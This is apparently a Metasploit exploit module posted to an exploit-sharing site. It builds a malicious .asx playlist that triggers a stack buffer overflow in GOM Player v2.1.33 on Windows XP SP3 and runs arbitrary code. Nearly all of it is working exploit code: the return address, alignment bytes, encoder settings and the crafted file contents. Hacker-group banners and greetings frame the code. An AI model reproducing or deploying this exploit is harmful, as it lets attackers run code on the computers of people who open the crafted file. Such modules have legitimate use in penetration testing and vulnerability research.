1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : GOM Player v2.1.33 (ASX) Stack Buffer Overflow (MSF)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
# Web Site : www.1337day.com * sec4ever.com * r00tw0rm.com
# Facebook : http://facebook.com/KedAns
# platform : windows (Local)
# Type : stack BOF
# Tested on : winXP sp3 (en)
###

##
# I'm BaCk fr0m OURHOUD ^__^ .. I m!Ss tHe Explo!tInG <3 <3 ^_*
##

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * Dr.55h |
# | KinG Of PiraTeS * The g0bl!n * soucha * dr.R!dE  .. |
# | ------------------------------------------------- < |
##

##
# $Id: $ gomasx_bof.rb | 15/01/2012 00:21 | KedAns-Dz $
##

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
         super(update_info(info,
           'Name' => 'GOM Player v2.1.33 (ASX) Stack Buffer Overflow',
           'Description'    => %q{
            This module exploits a stack buffer overflow in v.2.1.33
           creating a specially crafted .asx file, an attacker may be able 
           to execute arbitrary code.
            },
            'License' => MSF_LICENSE,
            'Author' => 
             [
             'Debasish Mandal', # Original
             'KedAns-Dz <ked-h[at]hotmail.com>' # MSF Module
             ],
            'Version' => 'Version 1.0',
            'References' =>
              [
                ['URL', 'http://www.1337day.com/exploits/17213' ], # Debasish Mandal
              ],
            'DefaultOptions' =>
              {
                'EXITFUNC' => 'process',
              },
            'Payload' =>
              {
                'Space' => 1024,
                'BadChars' => "\x0a\x3a",
                'StackAdjustment' => -3500,
        'DisableNops' => 'True',
                'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                'EncoderOptions' =>
                  {
                    'BufferRegister' => 'ESI',
                  }
              },
            'Platform' => 'win',
            'Targets' =>
              [
                [ 'Windows XP SP3 (En)', { 'Ret' => 0x41584155} ], # push ebp, pop eax
              ],
            'Privileged' => false,
            'DefaultTarget' => 0))

        register_options(
           [
              OptString.new('FILENAME', [ false, 'The file name.', 'msf.asx']),
           ], self.class)
    end
 
    def exploit
  
  pwd = "\x41" # align
    pwd << [target.ret].pack('V')
    pwd << "\x05\x11\x11" # add eax,11001100
    pwd << "\x41" # align
    pwd << "\x2d\x10\x11" # sub eax,11001000
    pwd << "\x41" * 109   # padding
    pwd << "\x40\x41\x40" # 2x inc eax
    pwd << "\x41"         # align
    
      sploit = ""
        sploit << "<asx version = '3.0' ><entry><title>ArirangTV</title><ref href = 'WWW."
        sploit << pwd
    sploit << payload.encoded
    sploit << "\xd9\x57" # call ebp - 0x005700d9
        sploit << rand_text_alphanumeric(51)
        sploit << rand_text_alphanumeric(53)
    sploit << "'/></entry></asx>"
    
 
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end


#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > || Rizky Ariestiyansyah * Islam Caddy ..
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * 
# Angel Injection (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * KinG Of PiraTeS * www.packetstormsecurity.org * TreX
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#================================================================================================